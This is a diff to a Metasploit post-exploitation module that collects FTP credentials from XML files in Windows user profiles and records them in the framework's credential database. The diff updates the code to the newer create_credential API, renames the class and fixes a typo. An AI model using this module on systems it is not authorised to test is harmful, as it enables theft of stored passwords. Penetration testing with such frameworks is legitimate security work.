@@ -1,14 +1,11 @@
 ##
-# This module requires Metasploit: http//metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
-require 'msf/core'
-require 'rex'
 require 'rexml/document'
 
-class Metasploit3 < Msf::Post
+class MetasploitModule < Msf::Post
   include Msf::Post::Windows::UserProfiles
 
   def initialize(info={})
@@ -67,7 +64,7 @@ class Metasploit3 < Msf::Post
     return xmlfiles
   end
 
-  #We attempt to open the dsicovered XML files and alert the user if
+  #We attempt to open the discovered XML files and alert the user if
   # we cannot access the file for any reason
   def get_xml(path)
     begin
@@ -109,14 +106,34 @@ class Metasploit3 < Msf::Post
       else
         source_id = nil
       end
-      report_auth_info(
-            :host  => host,
-            :port => port,
-            :source_id => source_id,
-            :source_type => "exploit",
-            :user => user,
-            :pass => pass
-          )
+      service_data = {
+          address: host,
+          port: port,
+          service_name: 'ftp',
+          protocol: 'tcp',
+          workspace_id: myworkspace_id
+      }
+
+      credential_data = {
+          origin_type: :session,
+          session_id: session_db_id,
+          post_reference_name: self.refname,
+          private_type: :password,
+          private_data: pass,
+          username: user
+      }
+
+      credential_data.merge!(service_data)
+
+      credential_core = create_credential(credential_data)
+      login_data ={
+          core: credential_core,
+          status: Metasploit::Model::Login::Status::UNTRIED
+      }
+
+      login_data.merge!(service_data)
+      login = create_credential_login(login_data)
+
     end
   end
 
